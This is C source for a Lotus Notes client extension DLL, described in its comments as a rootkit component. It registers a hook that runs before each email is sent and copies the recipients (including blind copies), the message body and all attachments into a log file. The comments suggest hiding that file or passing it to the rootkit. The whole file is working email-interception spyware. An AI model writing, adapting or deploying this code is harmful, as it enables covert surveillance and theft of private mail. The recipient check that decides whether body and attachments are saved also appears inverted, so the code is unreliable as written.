// LotusExtension
// Copyright Ric Vieler, 2006
// Filter Lotus Notes email

// Windows header files
#include <stdio.h>
#include <fcntl.h>
// Lotus Notes header files
#include <global.h>
#include <misc.h>
#include <mail.h>
#include <mailserv.h>
// Application specific header file
#include "LotusExtension.h"

// GLOBAL VARIABLES
EMHANDLER filterProcedure;
HEMREGISTRATION hHandler;
WORD recursionId;

// Copy email traffic to a storage directory
// (use RootkitDirectory if it is being hidden)
// or send email traffic to the rootkit.
void LogContent( char* content, int contentType )
{
	// Put content into one big file for this example
	BYTE buffer[ MAX_PATH ];
	size_t contentLength;
	FILE* sourceFile;
	FILE* destinationFile;

	// open the destination file - LN_LOG_FILE
	strcpy( buffer, LN_LOG_FILE );
	if( (destinationFile = fopen( buffer, "a+b" )) != NULL )
	{
		if( contentType == ADDRESS_STRING_CONTENT )
		{
			// content is a string
			// write address header
			fwrite( "DESTINATION(S):\n", sizeof(char), 16, destinationFile );
			// write addresses
			contentLength = strlen( content );
			fwrite( content, sizeof( char ), contentLength, destinationFile );
			// write address footer
			fwrite( "\n\n", sizeof( char ), 2, destinationFile );
		}
		else
		{
			// content is a filename
			if( (sourceFile = fopen( content, "r+b" )) != NULL )
			{
				// write header
				if( contentType == BODY_FILENAME_CONTENT )
					fwrite( "BODY:\n", sizeof(char), 6, destinationFile );
				else
					fwrite( "ATTACHMENT:\n", sizeof(char), 12, destinationFile );
				// write attachment
				do
				{
					contentLength = fread( buffer, sizeof(char), MAX_PATH, sourceFile );
					if( contentLength )
					{
						fwrite( buffer, sizeof(char), contentLength, destinationFile );
					}
				} while( contentLength == MAX_PATH );
				// write footer
				fwrite( "\n", sizeof( char ), 1, destinationFile );
				fclose( sourceFile );
			}
		}
		fclose( destinationFile );
	}
}

void SaveBody( HANDLE hNote )
{
	STATUS errorStatus;
	DWORD primaryFileSize;
    char primaryFile[MAX_PATH];

	// Construct temp file names
	strcpy( primaryFile, LN_BODY );
	
	// Put the body of the message into temp file.
	errorStatus = MailGetMessageBodyText(hNote,
		NULL,
		"\r\n",
		80,
		TRUE,
		primaryFile,
		&primaryFileSize);

	if ( !errorStatus && primaryFileSize > 0 )
		LogContent( primaryFile, BODY_FILENAME_CONTENT );
}

void SaveAttachments( HANDLE hNote )
{
	WORD attachment;
    BLOCKID blockID;
    char fileName[MAX_PATH + 1];

	// Construct temp file name
	strcpy( fileName, LN_ATTACHMENT );

	// Open the attachment (if any)
	for (attachment = 0;
		MailGetMessageAttachmentInfo(
			hNote,
			attachment,
			&blockID,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL,
			NULL);
		attachment++ )
	{
		//  extract the attachment
		if( !MailExtractMessageAttachment(hNote, blockID, fileName) )
		{
			// log the attachment
			LogContent( fileName, ATTACHMENT_FILENAME_CONTENT );
		}
	}
}

void ParseRecipientList( char* recipients, char* buffer, unsigned int* pIndex )
{
	int length;

	length = strlen( recipients );
	memcpy( buffer + *pIndex, recipients, length );
	*(buffer + *pIndex + length) = ',';
	length++;
	*pIndex += length;
}

BOOL SaveRecipients( HANDLE hNote )
{
	WORD stringLength;
	char string[MAXSPRINTF+1];
	char addresses[(MAXSPRINTF*3)+3];
	unsigned int addressesIndex = 0;

	MailGetMessageItem (hNote, MAIL_BLINDCOPYTO_ITEM_NUM, string, MAXSPRINTF, &stringLength);
	if( strlen( string ) )
		ParseRecipientList( string, addresses, &addressesIndex );

	MailGetMessageItem (hNote, MAIL_COPYTO_ITEM_NUM, string, MAXSPRINTF, &stringLength);
	if( strlen( string ) )
		ParseRecipientList( string, addresses, &addressesIndex );

	MailGetMessageItem (hNote, MAIL_SENDTO_ITEM_NUM, string, MAXSPRINTF, &stringLength);
	if( strlen( string ) )
		ParseRecipientList( string, addresses, &addressesIndex );

	if( addressesIndex > 1 )
	{
		// Overwrite last comma with string terminator
		addresses[addressesIndex-1] = 0;
		// Log destination addresses
		LogContent( addresses, ADDRESS_STRING_CONTENT );
		return TRUE;
	}
	return FALSE;
}

// Register for EM_MAILSENDNOTE - EM_REG_BEFORE events
STATUS RegisterEntry()
{
    STATUS error = NOERROR;

    error = EMRegister(EM_MAILSENDNOTE,
                       EM_REG_BEFORE,
	                   (EMHANDLER)filterProcedure,
	                   recursionId,
	                   &hHandler);

    return(error);
}

// Deregister filterProcedure
STATUS DeregisterEntry()
{
    STATUS error = NOERROR;

    error = EMDeregister(hHandler);

    return(error);
}

// This routine is defined by Lotus Notes
STATUS LNPUBLIC DLL_EXPORT MainEntryPoint( void )
{
    STATUS error;

    // Next get a recursion ID
    error = EMCreateRecursionID( &recursionId );

    if ( !error )
	  error = RegisterEntry();

    return( error );
}

// Called when Lotus Notes client is about to send.
// Return FALSE to block else return ERR_EM_CONTINUE
STATUS LNPUBLIC OnSendMail( EMRECORD* pExRecord )
{
	HANDLE hNote;
	void   *pViewDesc;
	WORD   Flags;
	BOOL   *pModified;
	VARARG_PTR ap;

	// get the arguments
	ap = pExRecord->Ap;
	hNote = VARARG_GET (ap, HANDLE);
	pViewDesc = VARARG_GET (ap, VOID *);
	Flags = VARARG_GET (ap, WORD);
	pModified = VARARG_GET (ap, BOOL *);

	// check for record error
	if (pExRecord->Status != NOERROR)
		return( ERR_EM_CONTINUE );

	// filter mail
	if( !SaveRecipients( hNote ) )
	{
		SaveBody( hNote );
		SaveAttachments( hNote );
	}

	return( ERR_EM_CONTINUE );
}

// Standard windows NT DLL entrypoint
BOOL WINAPI DllMain( HINSTANCE hInstance, DWORD fdwReason, LPVOID lpReserved )
{
	switch( fdwReason )
	{
		case DLL_PROCESS_ATTACH:
			// Initialize mail intercept procedure
			filterProcedure = (EMHANDLER)MakeProcInstance((FARPROC)OnSendMail, hInstance);
			break;
		case DLL_PROCESS_DETACH:
			// Free mail intercept procedure
			FreeProcInstance( filterProcedure );
			DeregisterEntry();
		break;
	}

	return( TRUE );
	UNREFERENCED_PARAMETER( lpReserved );
}